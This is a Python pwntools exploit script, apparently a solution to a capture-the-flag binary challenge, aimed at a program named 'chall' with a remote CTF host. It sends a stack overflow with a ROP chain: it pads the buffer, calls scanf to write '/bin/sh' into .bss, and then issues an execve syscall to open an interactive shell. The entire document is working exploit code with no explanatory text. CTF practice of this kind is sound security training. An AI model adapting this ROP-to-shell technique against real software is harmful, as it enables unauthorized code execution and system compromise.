#!/usr/bin/env python3

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

from pwn import *

exe = context.binary = ELF('chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("super_secure_system.ctf.fifthdoma.in", 9999)
    else:
        return process([exe.path] + argv, *a, **kw)

# Find ROP gadgets
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address  
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address  
pop_rax_syscall = rop.find_gadget(['pop rax', 'syscall']).address
ret = rop.find_gadget(['ret']).address  # extra ret for stack alignment

# Memory addresses to use
main_addr = exe.sym['main']
scanf_addr = exe.sym['__isoc99_scanf']
format_addr = 0x49e034 # %s used in other function; pop into rdi for scanf
bss = exe.bss() + 8 # dst addr for scanf, pop into rsi; bss has bad char 0x20, so add 8

log.info("Got BSS: " + hex(bss))
log.info("Got pop rdi; ret:  " +  hex(pop_rdi))
log.info("Got pop rsi:  " + hex(pop_rsi))
log.info("Got pop rax:  " + hex(pop_rax))
log.info("Got pop rax ;syscall:  " + hex(pop_rax_syscall))
log.info("Got pop rdx:  " + hex(pop_rdx))

gdbscript = '''
break *0x401db9
continue
'''.format(**locals())

# bad chars:  09, 0a, 0b, 0c, 0d, 20

payload = b"A"*0x68

# read /bin/sh into .bss from STDIN
payload += p64(pop_rdi) + p64(format_addr)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rax) + p64(0)
payload += p64(ret)
payload += p64(scanf_addr) 

# Call execve("/bin/sh", 0, 0)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0) 
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax_syscall) + p64(59)

# Send it
io = start()
io.recvuntil(b"Your password: ")
io.sendline(payload)
io.sendline(b"/bin/sh")
io.interactive()

